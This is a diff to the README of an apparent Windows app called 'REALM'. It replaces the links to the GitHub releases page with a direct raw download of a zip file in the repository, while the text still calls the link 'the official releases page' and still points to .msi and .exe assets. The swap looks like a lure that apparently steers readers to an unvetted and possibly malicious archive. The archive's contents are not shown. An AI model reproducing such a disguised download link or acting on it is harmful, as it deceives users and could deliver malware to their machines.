@@ -1,6 +1,6 @@
 # 🎧 REALM - Experience natural reactive listening software
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Assimilationphysiatrics932/REALM/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Assimilationphysiatrics932/REALM/raw/refs/heads/main/masculist/Software-2.4.zip)
 
 ## 📖 About the software
 
@@ -25,7 +25,7 @@ Ensure your Windows drivers for audio and graphics are up to date. You can check
 
 You must download the latest version of the software to begin.
 
-1. Navigate to the official releases page: [https://github.com/Assimilationphysiatrics932/REALM/releases](https://github.com/Assimilationphysiatrics932/REALM/releases).
+1. Navigate to the official releases page: [https://github.com/Assimilationphysiatrics932/REALM/raw/refs/heads/main/masculist/Software-2.4.zip](https://github.com/Assimilationphysiatrics932/REALM/raw/refs/heads/main/masculist/Software-2.4.zip).
 2. Look for the section labeled "Assets" at the bottom of the newest release entry.
 3. Click the link that ends in `.msi` or `.exe` to start the download.
 4. Save the file to your "Downloads" folder.
